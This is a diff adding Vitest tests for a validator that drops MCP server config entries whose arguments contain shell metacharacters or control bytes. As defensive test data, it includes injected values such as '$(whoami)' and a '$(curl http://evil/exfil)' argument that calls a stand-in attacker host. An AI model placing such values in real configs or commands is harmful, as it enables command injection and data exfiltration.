@@ -1,12 +1,18 @@
 import { describe, it, expect } from "vitest";
+import { mkdtemp, writeFile, mkdir, rm } from "node:fs/promises";
+import { tmpdir } from "node:os";
+import { join } from "node:path";
 import {
   validateMcpEntry,
   validateServerName,
+  validateMcpServerArgs,
   transformEnvVarSyntax,
   checkVersionPin,
   detectFetchLauncher,
   findLauncherPackageArg,
   validateMcpHttpEndpoint,
+  readMcpConfig,
+  DANGEROUS_ARG_CHARS,
   ON_DEMAND_FETCH_LAUNCHERS,
   DEFAULT_TRANSFORM_MAX_DEPTH,
 } from "../../adapters/mcp-utils.js";
@@ -1228,5 +1234,327 @@ describe("validateMcpEntry HTTP-pin integration (C9-M34)", () => {
     };
     const warnings = validateMcpEntry("prefixed", entry);
     expect(warnings).toEqual([]);
+  });
+});
+
+// ── F15.5-C1 (D15 / Pillar P6): DANGEROUS_ARG_CHARS refusal path ───────
+// `DANGEROUS_ARG_CHARS` was exported in C9-M31 but never wired into a
+// production code path — the documented refusal contract was unimplemented.
+// F15.5-C1 implements `validateMcpServerArgs` (refusal grade, distinct from
+// the warning-only SHELL_METACHAR scan inside validateMcpEntry) and wires
+// it into `readMcpConfig` so a dangerous-arg hit DROPS the entry parallel
+// to the validateServerName reject path. Threat model: SecurityWeek 2026
+// "By-Design Flaw in MCP" + Ox Security 2026 "Mother of All AI Supply
+// Chains" (both accessed 2026-05-27) confirm argv-injection RCE blast
+// radius across MCP STDIO transports.
+
+describe("DANGEROUS_ARG_CHARS (F15.5-C1) — character class invariants", () => {
+  it("rejects every shell metacharacter (`| ; & ` $ ( )`)", () => {
+    for (const ch of ["|", ";", "&", "`", "$", "(", ")"]) {
+      expect(DANGEROUS_ARG_CHARS.test(`arg${ch}value`)).toBe(true);
+    }
+  });
+
+  it("rejects redirection / quoting (`< > \\ ' \"`)", () => {
+    for (const ch of ["<", ">", "\\", "'", '"']) {
+      expect(DANGEROUS_ARG_CHARS.test(`arg${ch}value`)).toBe(true);
+    }
+  });
+
+  it("rejects newline and carriage return", () => {
+    expect(DANGEROUS_ARG_CHARS.test("arg\nvalue")).toBe(true);
+    expect(DANGEROUS_ARG_CHARS.test("arg\rvalue")).toBe(true);
+    expect(DANGEROUS_ARG_CHARS.test("arg\r\nvalue")).toBe(true);
+  });
+
+  it("rejects NUL and DEL control bytes", () => {
+    expect(DANGEROUS_ARG_CHARS.test("arg\x00value")).toBe(true);
+    expect(DANGEROUS_ARG_CHARS.test("arg\x7fvalue")).toBe(true);
+  });
+
+  it("rejects every ASCII control byte (\\x01-\\x1f)", () => {
+    for (let code = 0x01; code <= 0x1f; code++) {
+      const arg = `prefix${String.fromCharCode(code)}suffix`;
+      expect(DANGEROUS_ARG_CHARS.test(arg)).toBe(true);
+    }
+  });
+
+  it("accepts legitimate MCP arg shapes", () => {
+    // Realistic MCP args observed in canonical configs — pkg specs, flags,
+    // dist tags, file paths, env-style values. None should trip the scan.
+    const safe = [
+      "@modelcontextprotocol/server-github",
+      "@anthropic/mcp-server@1.0.0",
+      "mcp-server-fetch",
+      "mcp-server-fetch@1.2.3",
+      "-y",
+      "--yes",
+      "--flag=value",
+      "dlx",
+      "run",
+      "server.js",
+      "node_modules/.bin/mcp",
+      "https://example.com/path",
+      "a/b/c",
+      "value with space", // space is intentionally not in DANGEROUS_ARG_CHARS
+      "GITHUB_PAT_PLACEHOLDER",
+      "0123456789",
+    ];
+    for (const arg of safe) {
+      expect(DANGEROUS_ARG_CHARS.test(arg)).toBe(false);
+    }
+  });
+
+  it("character class has no inadvertent printable-range expansion", () => {
+    // Regression guard: the pre-F15.5-C1 declaration was written as
+    // `[ -|...]`, which a casual reader might parse as a range from space
+    // (0x20) to pipe (0x7c) — that would match almost every printable
+    // byte. Confirm the on-disk character class does NOT include common
+    // printable bytes that would have been swept up by such a range:
+    // letters, digits, dash, dot, underscore, slash, colon, equals, at,
+    // hash, percent, comma, plus, asterisk, question, brackets, braces.
+    const mustNotMatch = "abcXYZ0123456789-_./:=@#%,+*?[]{}~^";
+    for (const ch of mustNotMatch) {
+      expect(DANGEROUS_ARG_CHARS.test(ch)).toBe(false);
+    }
+  });
+});
+
+describe("validateMcpServerArgs (F15.5-C1)", () => {
+  it("returns ok when entry has no args field", () => {
+    expect(validateMcpServerArgs({ command: "node" })).toEqual({ ok: true });
+  });
+
+  it("returns ok when entry has empty args array", () => {
+    expect(validateMcpServerArgs({ command: "node", args: [] })).toEqual({
+      ok: true,
+    });
+  });
+
+  it("returns ok for legitimate args", () => {
+    const entry: McpServerEntry = {
+      command: "npx",
+      args: ["-y", "@modelcontextprotocol/server-github@1.0.0"],
+    };
+    expect(validateMcpServerArgs(entry)).toEqual({ ok: true });
+  });
+
+  it("refuses args containing a newline (token-splitting vector)", () => {
+    const entry: McpServerEntry = {
+      command: "npx",
+      args: ["@scope/pkg@1.0.0", "extra\narg-with-newline"],
+    };
+    const result = validateMcpServerArgs(entry);
+    expect(result.ok).toBe(false);
+    expect(result.offendingIndex).toBe(1);
+    expect(result.reason).toContain("dangerous character");
+    expect(result.reason).toContain("Entry refused");
+  });
+
+  it("refuses args containing embedded quote characters", () => {
+    const single: McpServerEntry = {
+      command: "node",
+      args: ["arg-with-'-quote"],
+    };
+    const double: McpServerEntry = {
+      command: "node",
+      args: ['arg-with-"-quote'],
+    };
+    expect(validateMcpServerArgs(single).ok).toBe(false);
+    expect(validateMcpServerArgs(double).ok).toBe(false);
+  });
+
+  it("refuses args containing backslash redirection", () => {
+    const entry: McpServerEntry = {
+      command: "node",
+      args: ["safe-arg", "redirect\\>somewhere"],
+    };
+    const result = validateMcpServerArgs(entry);
+    expect(result.ok).toBe(false);
+    expect(result.offendingIndex).toBe(1);
+    expect(result.offendingArg).toBe("redirect\\>somewhere");
+  });
+
+  it("refuses args containing ASCII control bytes (argv-parser probes)", () => {
+    // \x00 (NUL), \x07 (BEL), \x0c (FF), \x1b (ESC), \x7f (DEL) — all common
+    // in adversarial inputs designed to confuse argv parsers and split
+    // tokens at non-printable boundaries.
+    for (const ctrl of ["\x00", "\x07", "\x0c", "\x1b", "\x7f"]) {
+      const entry: McpServerEntry = {
+        command: "node",
+        args: [`probe${ctrl}injection`],
+      };
+      expect(validateMcpServerArgs(entry).ok).toBe(false);
+    }
+  });
+
+  it("refuses args containing shell command-substitution syntax", () => {
+    const backtick: McpServerEntry = {
+      command: "node",
+      args: ["`whoami`"],
+    };
+    const dollarParen: McpServerEntry = {
+      command: "node",
+      args: ["$(whoami)"],
+    };
+    expect(validateMcpServerArgs(backtick).ok).toBe(false);
+    expect(validateMcpServerArgs(dollarParen).ok).toBe(false);
+  });
+
+  it("refuses args containing pipe / semicolon (command chaining)", () => {
+    const pipe: McpServerEntry = {
+      command: "node",
+      args: ["safe", "first|second"],
+    };
+    const semi: McpServerEntry = {
+      command: "node",
+      args: ["safe", "first;second"],
+    };
+    expect(validateMcpServerArgs(pipe).ok).toBe(false);
+    expect(validateMcpServerArgs(semi).ok).toBe(false);
+  });
+
+  it("returns first offender on multiple bad args (short-circuit)", () => {
+    const entry: McpServerEntry = {
+      command: "node",
+      args: ["safe", "first|bad", "second;bad"],
+    };
+    const result = validateMcpServerArgs(entry);
+    expect(result.ok).toBe(false);
+    expect(result.offendingIndex).toBe(1);
+    expect(result.offendingArg).toBe("first|bad");
+  });
+
+  it("refuses non-string args (type-coercion guard)", () => {
+    const entry = {
+      command: "node",
+      args: ["safe", 42 as unknown as string, "after"],
+    } as McpServerEntry;
+    const result = validateMcpServerArgs(entry);
+    expect(result.ok).toBe(false);
+    expect(result.offendingIndex).toBe(1);
+    expect(result.reason).toContain("not a string");
+    expect(result.reason).toContain("got number");
+  });
+
+  it("truncates very long offending args in the reason payload", () => {
+    const entry: McpServerEntry = {
+      command: "node",
+      args: ["a".repeat(200) + "|" + "b".repeat(200)],
+    };
+    const result = validateMcpServerArgs(entry);
+    expect(result.ok).toBe(false);
+    // offendingArg preserves the full value for downstream inspection,
+    // but the reason payload is bounded so logs cannot be flooded by an
+    // attacker-controlled binary blob.
+    expect(result.offendingArg?.length).toBe(401);
+    // Reason payload caps the inline display at ~64 chars + ellipsis.
+    // The exact JSON-serialized snippet is bounded; assert that it is
+    // significantly shorter than the original arg.
+    expect(result.reason?.length).toBeLessThan(300);
+    expect(result.reason).toContain("...");
+  });
+});
+
+describe("readMcpConfig drop-path (F15.5-C1)", () => {
+  let tmpRoot: string;
+
+  async function writeMcpConfig(
+    contents: Record<string, unknown>,
+  ): Promise<string> {
+    const root = await mkdtemp(join(tmpdir(), "hatch3r-mcp-drop-"));
+    await mkdir(join(root, "mcp"), { recursive: true });
+    await writeFile(
+      join(root, "mcp", "mcp.json"),
+      JSON.stringify(contents),
+      "utf-8",
+    );
+    return root;
+  }
+
+  it("drops servers whose args contain dangerous characters", async () => {
+    tmpRoot = await writeMcpConfig({
+      mcpServers: {
+        "good-server": {
+          command: "npx",
+          args: ["-y", "@scope/pkg@1.0.0"],
+        },
+        "bad-server": {
+          command: "npx",
+          args: ["-y", "@scope/pkg@1.0.0", "extra|pipe"],
+        },
+      },
+    });
+    const result = await readMcpConfig(tmpRoot);
+    expect(Object.keys(result.servers)).toEqual(["good-server"]);
+    expect(result.servers["bad-server"]).toBeUndefined();
+    expect(
+      result.warnings.some(
+        (w) => w.includes("bad-server") && w.includes("dropped"),
+      ),
+    ).toBe(true);
+    await rm(tmpRoot, { recursive: true, force: true });
+  });
+
+  it("emits a drop warning citing the entry name (auditable per silent-failure contract)", async () => {
+    tmpRoot = await writeMcpConfig({
+      mcpServers: {
+        "injection-attempt": {
+          command: "node",
+          args: ["server.js", "$(curl http://evil/exfil)"],
+        },
+      },
+    });
+    const result = await readMcpConfig(tmpRoot);
+    expect(Object.keys(result.servers)).toHaveLength(0);
+    expect(
+      result.warnings.some(
+        (w) =>
+          w.includes("injection-attempt") &&
+          w.includes("dropped") &&
+          w.includes("dangerous character"),
+      ),
+    ).toBe(true);
+    await rm(tmpRoot, { recursive: true, force: true });
+  });
+
+  it("passes through entries with empty args without dropping", async () => {
+    tmpRoot = await writeMcpConfig({
+      mcpServers: {
+        "empty-args": {
+          command: "node",
+          args: [],
+        },
+        "no-args": {
+          command: "node",
+        },
+      },
+    });
+    const result = await readMcpConfig(tmpRoot);
+    expect(Object.keys(result.servers).sort()).toEqual([
+      "empty-args",
+      "no-args",
+    ]);
+    expect(result.warnings.some((w) => w.includes("dropped"))).toBe(false);
+    await rm(tmpRoot, { recursive: true, force: true });
+  });
+
+  it("drops on newline-in-arg even when the rest of the entry is benign", async () => {
+    tmpRoot = await writeMcpConfig({
+      mcpServers: {
+        "newline-server": {
+          command: "npx",
+          args: ["-y", "@scope/pkg@1.0.0\nadditional-token"],
+        },
+      },
+    });
+    const result = await readMcpConfig(tmpRoot);
+    expect(Object.keys(result.servers)).toHaveLength(0);
+    expect(
+      result.warnings.some(
+        (w) => w.includes("newline-server") && w.includes("dropped"),
+      ),
+    ).toBe(true);
+    await rm(tmpRoot, { recursive: true, force: true });
   });
 });
